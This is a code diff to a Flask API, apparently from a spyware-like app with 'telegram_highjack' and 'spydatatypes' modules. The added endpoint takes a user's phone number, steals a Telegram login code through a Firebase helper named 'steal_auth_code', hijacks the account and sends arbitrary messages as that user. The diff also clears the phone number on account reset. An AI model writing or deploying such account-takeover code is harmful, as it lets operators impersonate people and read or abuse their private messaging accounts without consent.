@@ -1,6 +1,7 @@
 """API Endpoints to get and reset data"""
 import subprocess
 import os, sys
+import asyncio
 from datetime import datetime
 from flask import request, jsonify
 from sqlalchemy.exc import InvalidRequestError
@@ -13,6 +14,40 @@ from app.models.userdata_models import Contact, spydatatypes
 from app.models.personalization_model import Personalization
 from app.models.utility import db_entry_to_dict, db_single_element_query
 from app.story.story_controller import StoryController
+from app.telegram_highjack.hacked_client import HackedClient
+from app.firebase_interaction import FirebaseInteraction
+
+# ------------------- Hacking ---------------------
+@app.route('/users/<user_id>/hack/send-message', methods=['POST'])
+def send_user_message(user_id):
+    """tries to hack a user account and send a message via his account"""
+    messages = request.get_json()
+    if not messages:
+        return jsonify("please valid json"), 400
+    if not isinstance(messages, list):
+        return jsonify("please provide a list of messages [message, message, ...]"), 400     
+    for message in messages:
+        if not message["receiver"]:
+            return jsonify("missing receiver"), 400
+        if not message["text"]:
+            return jsonify("missing text"), 400
+    
+    try:
+        user = db_single_element_query(User, {"user_id": user_id}, "user")
+    except ValueError as e:
+        return jsonify([str(e)]), 400
+    if not user.phonenumber:
+        return jsonify("you must first set the users phonenumber"), 400
+
+    asyncio.run(hack_and_send_message(int(user_id), user.phonenumber, messages))
+    return jsonify("client hacked and message sent"), 200
+
+async def hack_and_send_message(user_id, phonenumber, messages):
+    """tries to hack a user account and send a message via his account"""
+    client = HackedClient(user_id, phonenumber, FirebaseInteraction.steal_auth_code)
+    async with client:
+        for message in messages:
+            await client.send_message(message["receiver"], message["text"])
 
 # ---------- Git Webhook (Re-)Deployment ----------
 @app.route('/update')
@@ -62,6 +97,7 @@ def reset_user(user_id):
             user.firstname = None
             user.current_story_point = None
             user.firebase_token = None
+            user.phonenumber = None
             db.session.add(user)
 
             user_personalization = Personalization.query.get(user.user_id)
